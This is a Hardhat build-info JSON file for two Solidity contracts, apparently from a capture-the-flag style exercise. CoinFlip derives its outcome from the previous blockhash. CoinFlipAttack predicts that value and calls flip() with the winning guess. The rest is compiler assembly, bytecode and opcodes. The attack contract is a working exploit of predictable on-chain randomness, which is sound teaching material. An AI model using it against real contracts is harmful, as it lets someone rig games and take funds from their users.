{
	"id": "45d1fa66acbc734d98a46557c7dc1adb",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.27",
	"solcLongVersion": "0.8.27+commit.40a35a09",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/CoinFlipAttack.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"contracts/CoinFlip.sol\";\n\ncontract CoinFlipAttack {\n    CoinFlip public  victimContract;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor(address _victimContract) {\n        victimContract = CoinFlip(_victimContract);\n    }\n    \n    function flipAttack() public {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        victimContract.flip(side);\n    }\n}"
			},
			"contracts/CoinFlip.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/CoinFlip.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/CoinFlip.sol\":58:796  contract CoinFlip {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/CoinFlip.sol\":157:234  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinFlip.sol\":140:234  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contracts/CoinFlip.sol\":241:291  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n    /* \"contracts/CoinFlip.sol\":283:284  0 */\n  0x00\n    /* \"contracts/CoinFlip.sol\":265:280  consecutiveWins */\n  0x00\n    /* \"contracts/CoinFlip.sol\":265:284  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinFlip.sol\":58:796  contract CoinFlip {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinFlip.sol\":58:796  contract CoinFlip {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/CoinFlip.sol\":297:794  function flip(bool _guess) public returns (bool) {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinFlip.sol\":82:112  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinFlip.sol\":297:794  function flip(bool _guess) public returns (bool) {... */\n    tag_8:\n        /* \"contracts/CoinFlip.sol\":340:344  bool */\n      0x00\n        /* \"contracts/CoinFlip.sol\":356:374  uint256 blockValue */\n      0x00\n        /* \"contracts/CoinFlip.sol\":410:411  1 */\n      0x01\n        /* \"contracts/CoinFlip.sol\":395:407  block.number */\n      number\n        /* \"contracts/CoinFlip.sol\":395:411  block.number - 1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"contracts/CoinFlip.sol\":385:412  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/CoinFlip.sol\":377:413  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinFlip.sol\":356:413  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":440:450  blockValue */\n      dup1\n        /* \"contracts/CoinFlip.sol\":428:436  lastHash */\n      sload(0x01)\n        /* \"contracts/CoinFlip.sol\":428:450  lastHash == blockValue */\n      sub\n        /* \"contracts/CoinFlip.sol\":424:485  if (lastHash == blockValue) {... */\n      tag_18\n      jumpi\n        /* \"contracts/CoinFlip.sol\":466:474  revert() */\n      revert(0x00, 0x00)\n        /* \"contracts/CoinFlip.sol\":424:485  if (lastHash == blockValue) {... */\n    tag_18:\n        /* \"contracts/CoinFlip.sol\":506:516  blockValue */\n      dup1\n        /* \"contracts/CoinFlip.sol\":495:503  lastHash */\n      0x01\n        /* \"contracts/CoinFlip.sol\":495:516  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/CoinFlip.sol\":526:542  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinFlip.sol\":558:564  FACTOR */\n      sload(0x02)\n        /* \"contracts/CoinFlip.sol\":545:555  blockValue */\n      dup3\n        /* \"contracts/CoinFlip.sol\":545:564  blockValue / FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"contracts/CoinFlip.sol\":526:564  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":574:583  bool side */\n      0x00\n        /* \"contracts/CoinFlip.sol\":598:599  1 */\n      0x01\n        /* \"contracts/CoinFlip.sol\":586:594  coinFlip */\n      dup3\n        /* \"contracts/CoinFlip.sol\":586:599  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinFlip.sol\":586:614  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"contracts/CoinFlip.sol\":609:614  false */\n      0x00\n        /* \"contracts/CoinFlip.sol\":586:614  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"contracts/CoinFlip.sol\":602:606  true */\n      0x01\n        /* \"contracts/CoinFlip.sol\":586:614  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"contracts/CoinFlip.sol\":574:614  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinFlip.sol\":637:643  _guess */\n      dup5\n        /* \"contracts/CoinFlip.sol\":629:643  side == _guess */\n      iszero\n      iszero\n        /* \"contracts/CoinFlip.sol\":629:633  side */\n      dup2\n        /* \"contracts/CoinFlip.sol\":629:643  side == _guess */\n      iszero\n      iszero\n      sub\n        /* \"contracts/CoinFlip.sol\":625:788  if (side == _guess) {... */\n      tag_23\n      jumpi\n        /* \"contracts/CoinFlip.sol\":659:674  consecutiveWins */\n      0x00\n      0x00\n        /* \"contracts/CoinFlip.sol\":659:676  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/CoinFlip.sol\":697:701  true */\n      0x01\n        /* \"contracts/CoinFlip.sol\":690:701  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"contracts/CoinFlip.sol\":625:788  if (side == _guess) {... */\n    tag_23:\n        /* \"contracts/CoinFlip.sol\":750:751  0 */\n      0x00\n        /* \"contracts/CoinFlip.sol\":732:747  consecutiveWins */\n      0x00\n        /* \"contracts/CoinFlip.sol\":732:751  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/CoinFlip.sol\":772:777  false */\n      0x00\n        /* \"contracts/CoinFlip.sol\":765:777  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/CoinFlip.sol\":297:794  function flip(bool _guess) public returns (bool) {... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/CoinFlip.sol\":82:112  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_28:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:424   */\n    tag_30:\n        /* \"#utility.yul\":368:375   */\n      0x00\n        /* \"#utility.yul\":411:416   */\n      dup2\n        /* \"#utility.yul\":404:417   */\n      iszero\n        /* \"#utility.yul\":397:418   */\n      iszero\n        /* \"#utility.yul\":386:418   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":430:546   */\n    tag_31:\n        /* \"#utility.yul\":500:521   */\n      tag_44\n        /* \"#utility.yul\":515:520   */\n      dup2\n        /* \"#utility.yul\":500:521   */\n      tag_30\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":493:498   */\n      dup2\n        /* \"#utility.yul\":490:522   */\n      eq\n        /* \"#utility.yul\":480:540   */\n      tag_45\n      jumpi\n        /* \"#utility.yul\":536:537   */\n      0x00\n        /* \"#utility.yul\":533:534   */\n      0x00\n        /* \"#utility.yul\":526:538   */\n      revert\n        /* \"#utility.yul\":480:540   */\n    tag_45:\n        /* \"#utility.yul\":430:546   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":552:685   */\n    tag_32:\n        /* \"#utility.yul\":595:600   */\n      0x00\n        /* \"#utility.yul\":633:639   */\n      dup2\n        /* \"#utility.yul\":620:640   */\n      calldataload\n        /* \"#utility.yul\":611:640   */\n      swap1\n      pop\n        /* \"#utility.yul\":649:679   */\n      tag_47\n        /* \"#utility.yul\":673:678   */\n      dup2\n        /* \"#utility.yul\":649:679   */\n      tag_31\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":552:685   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":691:1014   */\n    tag_7:\n        /* \"#utility.yul\":747:753   */\n      0x00\n        /* \"#utility.yul\":796:798   */\n      0x20\n        /* \"#utility.yul\":784:793   */\n      dup3\n        /* \"#utility.yul\":775:782   */\n      dup5\n        /* \"#utility.yul\":771:794   */\n      sub\n        /* \"#utility.yul\":767:799   */\n      slt\n        /* \"#utility.yul\":764:883   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":802:881   */\n      tag_50\n      tag_28\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":764:883   */\n    tag_49:\n        /* \"#utility.yul\":922:923   */\n      0x00\n        /* \"#utility.yul\":947:997   */\n      tag_51\n        /* \"#utility.yul\":989:996   */\n      dup5\n        /* \"#utility.yul\":980:986   */\n      dup3\n        /* \"#utility.yul\":969:978   */\n      dup6\n        /* \"#utility.yul\":965:987   */\n      add\n        /* \"#utility.yul\":947:997   */\n      tag_32\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":937:997   */\n      swap2\n      pop\n        /* \"#utility.yul\":893:1007   */\n      pop\n        /* \"#utility.yul\":691:1014   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1020:1129   */\n    tag_33:\n        /* \"#utility.yul\":1101:1122   */\n      tag_53\n        /* \"#utility.yul\":1116:1121   */\n      dup2\n        /* \"#utility.yul\":1101:1122   */\n      tag_30\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1096:1099   */\n      dup3\n        /* \"#utility.yul\":1089:1123   */\n      mstore\n        /* \"#utility.yul\":1020:1129   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1135:1345   */\n    tag_10:\n        /* \"#utility.yul\":1222:1226   */\n      0x00\n        /* \"#utility.yul\":1260:1262   */\n      0x20\n        /* \"#utility.yul\":1249:1258   */\n      dup3\n        /* \"#utility.yul\":1245:1263   */\n      add\n        /* \"#utility.yul\":1237:1263   */\n      swap1\n      pop\n        /* \"#utility.yul\":1273:1338   */\n      tag_55\n        /* \"#utility.yul\":1335:1336   */\n      0x00\n        /* \"#utility.yul\":1324:1333   */\n      dup4\n        /* \"#utility.yul\":1320:1337   */\n      add\n        /* \"#utility.yul\":1311:1317   */\n      dup5\n        /* \"#utility.yul\":1273:1338   */\n      tag_33\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1135:1345   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1351:1428   */\n    tag_34:\n        /* \"#utility.yul\":1388:1395   */\n      0x00\n        /* \"#utility.yul\":1417:1422   */\n      dup2\n        /* \"#utility.yul\":1406:1422   */\n      swap1\n      pop\n        /* \"#utility.yul\":1351:1428   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1434:1552   */\n    tag_35:\n        /* \"#utility.yul\":1521:1545   */\n      tag_58\n        /* \"#utility.yul\":1539:1544   */\n      dup2\n        /* \"#utility.yul\":1521:1545   */\n      tag_34\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1516:1519   */\n      dup3\n        /* \"#utility.yul\":1509:1546   */\n      mstore\n        /* \"#utility.yul\":1434:1552   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1780   */\n    tag_14:\n        /* \"#utility.yul\":1651:1655   */\n      0x00\n        /* \"#utility.yul\":1689:1691   */\n      0x20\n        /* \"#utility.yul\":1678:1687   */\n      dup3\n        /* \"#utility.yul\":1674:1692   */\n      add\n        /* \"#utility.yul\":1666:1692   */\n      swap1\n      pop\n        /* \"#utility.yul\":1702:1773   */\n      tag_60\n        /* \"#utility.yul\":1770:1771   */\n      0x00\n        /* \"#utility.yul\":1759:1768   */\n      dup4\n        /* \"#utility.yul\":1755:1772   */\n      add\n        /* \"#utility.yul\":1746:1752   */\n      dup5\n        /* \"#utility.yul\":1702:1773   */\n      tag_35\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1558:1780   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1786:1966   */\n    tag_36:\n        /* \"#utility.yul\":1834:1911   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1831:1832   */\n      0x00\n        /* \"#utility.yul\":1824:1912   */\n      mstore\n        /* \"#utility.yul\":1931:1935   */\n      0x11\n        /* \"#utility.yul\":1928:1929   */\n      0x04\n        /* \"#utility.yul\":1921:1936   */\n      mstore\n        /* \"#utility.yul\":1955:1959   */\n      0x24\n        /* \"#utility.yul\":1952:1953   */\n      0x00\n        /* \"#utility.yul\":1945:1960   */\n      revert\n        /* \"#utility.yul\":1972:2166   */\n    tag_17:\n        /* \"#utility.yul\":2012:2016   */\n      0x00\n        /* \"#utility.yul\":2032:2052   */\n      tag_63\n        /* \"#utility.yul\":2050:2051   */\n      dup3\n        /* \"#utility.yul\":2032:2052   */\n      tag_34\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2027:2052   */\n      swap2\n      pop\n        /* \"#utility.yul\":2066:2086   */\n      tag_64\n        /* \"#utility.yul\":2084:2085   */\n      dup4\n        /* \"#utility.yul\":2066:2086   */\n      tag_34\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2061:2086   */\n      swap3\n      pop\n        /* \"#utility.yul\":2110:2111   */\n      dup3\n        /* \"#utility.yul\":2107:2108   */\n      dup3\n        /* \"#utility.yul\":2103:2112   */\n      sub\n        /* \"#utility.yul\":2095:2112   */\n      swap1\n      pop\n        /* \"#utility.yul\":2134:2135   */\n      dup2\n        /* \"#utility.yul\":2128:2132   */\n      dup2\n        /* \"#utility.yul\":2125:2136   */\n      gt\n        /* \"#utility.yul\":2122:2159   */\n      iszero\n      tag_65\n      jumpi\n        /* \"#utility.yul\":2139:2157   */\n      tag_66\n      tag_36\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2122:2159   */\n    tag_65:\n        /* \"#utility.yul\":1972:2166   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2172:2352   */\n    tag_37:\n        /* \"#utility.yul\":2220:2297   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2217:2218   */\n      0x00\n        /* \"#utility.yul\":2210:2298   */\n      mstore\n        /* \"#utility.yul\":2317:2321   */\n      0x12\n        /* \"#utility.yul\":2314:2315   */\n      0x04\n        /* \"#utility.yul\":2307:2322   */\n      mstore\n        /* \"#utility.yul\":2341:2345   */\n      0x24\n        /* \"#utility.yul\":2338:2339   */\n      0x00\n        /* \"#utility.yul\":2331:2346   */\n      revert\n        /* \"#utility.yul\":2358:2543   */\n    tag_20:\n        /* \"#utility.yul\":2398:2399   */\n      0x00\n        /* \"#utility.yul\":2415:2435   */\n      tag_69\n        /* \"#utility.yul\":2433:2434   */\n      dup3\n        /* \"#utility.yul\":2415:2435   */\n      tag_34\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2410:2435   */\n      swap2\n      pop\n        /* \"#utility.yul\":2449:2469   */\n      tag_70\n        /* \"#utility.yul\":2467:2468   */\n      dup4\n        /* \"#utility.yul\":2449:2469   */\n      tag_34\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2444:2469   */\n      swap3\n      pop\n        /* \"#utility.yul\":2488:2489   */\n      dup3\n        /* \"#utility.yul\":2478:2513   */\n      tag_71\n      jumpi\n        /* \"#utility.yul\":2493:2511   */\n      tag_72\n      tag_37\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2478:2513   */\n    tag_71:\n        /* \"#utility.yul\":2535:2536   */\n      dup3\n        /* \"#utility.yul\":2532:2533   */\n      dup3\n        /* \"#utility.yul\":2528:2537   */\n      div\n        /* \"#utility.yul\":2523:2537   */\n      swap1\n      pop\n        /* \"#utility.yul\":2358:2543   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2549:2782   */\n    tag_25:\n        /* \"#utility.yul\":2588:2591   */\n      0x00\n        /* \"#utility.yul\":2611:2635   */\n      tag_74\n        /* \"#utility.yul\":2629:2634   */\n      dup3\n        /* \"#utility.yul\":2611:2635   */\n      tag_34\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2602:2635   */\n      swap2\n      pop\n        /* \"#utility.yul\":2657:2723   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2650:2655   */\n      dup3\n        /* \"#utility.yul\":2647:2724   */\n      sub\n        /* \"#utility.yul\":2644:2747   */\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2727:2745   */\n      tag_76\n      tag_36\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2644:2747   */\n    tag_75:\n        /* \"#utility.yul\":2774:2775   */\n      0x01\n        /* \"#utility.yul\":2767:2772   */\n      dup3\n        /* \"#utility.yul\":2763:2776   */\n      add\n        /* \"#utility.yul\":2756:2776   */\n      swap1\n      pop\n        /* \"#utility.yul\":2549:2782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220600c01c94b94dccd9b2d13cb809818dbacf42bbd2b43e8676a47093f835e081e64736f6c634300081b0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_16": {
									"entryPoint": null,
									"id": 16,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f80000000000000000000000000000000000000000000000000000000000000006002553480156032575f5ffd5b505f5f8190555061030e806100465f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80631d263f6714610038578063e6f334d714610068575b5f5ffd5b610052600480360381019061004d9190610150565b610086565b60405161005f919061018a565b60405180910390f35b610070610112565b60405161007d91906101bb565b60405180910390f35b5f5f6001436100959190610201565b405f1c905080600154036100a7575f5ffd5b806001819055505f600254826100bd9190610261565b90505f600182146100ce575f6100d1565b60015b905084151581151503610100575f5f8154809291906100ef90610291565b91905055506001935050505061010d565b5f5f819055505f93505050505b919050565b5f5481565b5f5ffd5b5f8115159050919050565b61012f8161011b565b8114610139575f5ffd5b50565b5f8135905061014a81610126565b92915050565b5f6020828403121561016557610164610117565b5b5f6101728482850161013c565b91505092915050565b6101848161011b565b82525050565b5f60208201905061019d5f83018461017b565b92915050565b5f819050919050565b6101b5816101a3565b82525050565b5f6020820190506101ce5f8301846101ac565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020b826101a3565b9150610216836101a3565b925082820390508181111561022e5761022d6101d4565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61026b826101a3565b9150610276836101a3565b92508261028657610285610234565b5b828204905092915050565b5f61029b826101a3565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102cd576102cc6101d4565b5b60018201905091905056fea2646970667358221220600c01c94b94dccd9b2d13cb809818dbacf42bbd2b43e8676a47093f835e081e64736f6c634300081b0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0x32 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH0 PUSH0 DUP2 SWAP1 SSTORE POP PUSH2 0x30E DUP1 PUSH2 0x46 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x68 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x150 JUMP JUMPDEST PUSH2 0x86 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5F SWAP2 SWAP1 PUSH2 0x18A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH2 0x112 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7D SWAP2 SWAP1 PUSH2 0x1BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x95 SWAP2 SWAP1 PUSH2 0x201 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xA7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xBD SWAP2 SWAP1 PUSH2 0x261 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0xCE JUMPI PUSH0 PUSH2 0xD1 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x100 JUMPI PUSH0 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xEF SWAP1 PUSH2 0x291 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x10D JUMP JUMPDEST PUSH0 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0x11B JUMP JUMPDEST DUP2 EQ PUSH2 0x139 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x14A DUP2 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x165 JUMPI PUSH2 0x164 PUSH2 0x117 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x172 DUP5 DUP3 DUP6 ADD PUSH2 0x13C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x184 DUP2 PUSH2 0x11B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19D PUSH0 DUP4 ADD DUP5 PUSH2 0x17B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1B5 DUP2 PUSH2 0x1A3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CE PUSH0 DUP4 ADD DUP5 PUSH2 0x1AC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x20B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x216 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x22E JUMPI PUSH2 0x22D PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x26B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x276 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x286 JUMPI PUSH2 0x285 PUSH2 0x234 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x29B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2CD JUMPI PUSH2 0x2CC PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0xC ADD 0xC9 0x4B SWAP5 0xDC 0xCD SWAP12 0x2D SGT 0xCB DUP1 SWAP9 XOR 0xDB 0xAC DELEGATECALL 0x2B 0xBD 0x2B NUMBER 0xE8 PUSH8 0x6A47093F835E081E PUSH5 0x736F6C6343 STOP ADDMOD SHL STOP CALLER ",
